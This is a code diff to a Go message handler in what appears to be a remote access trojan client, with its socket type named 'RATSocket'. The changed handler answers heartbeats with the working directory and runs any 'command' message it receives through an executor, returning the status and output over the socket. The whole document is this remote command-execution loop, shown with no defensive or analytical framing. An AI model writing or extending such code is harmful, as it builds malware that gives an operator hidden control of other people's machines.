@@ -1,34 +1,43 @@
 package handler
 
 import (
+	"os"
 	"time"
 
 	"client-go/executor"
+	"client-go/protocol"
 )
 
-func Handle(session *executor.Session, msg map[string]interface{}) {
+func Handle(sock *protocol.RATSocket, msg map[string]interface{}) {
+
 	switch msg["type"] {
+
 	case "heartbeat":
-		_ = session.Sock.Send(map[string]interface{}{
+		sock.Send(map[string]interface{}{
 			"type":      "heartbeat_ack",
 			"id":        msg["id"],
 			"client_ts": time.Now().Unix(),
-			"cwd":       session.Cwd,
+			"cwd":       cwd(),
 		})
 
 	case "command":
 		id := int(msg["id"].(float64))
 		cmd := msg["text"].(string)
 
-		status, result := session.Dispatch(id, cmd)
+		status, result := executor.Execute(cmd)
 
-		_ = session.Sock.Send(map[string]interface{}{
+		sock.Send(map[string]interface{}{
 			"type":   "result",
 			"id":     id,
 			"status": status,
 			"text":   result,
-			"cwd":    session.Cwd,
+			"cwd":    cwd(),
 			"eof":    1,
 		})
 	}
+}
+
+func cwd() string {
+	d, _ := os.Getwd()
+	return d
 }
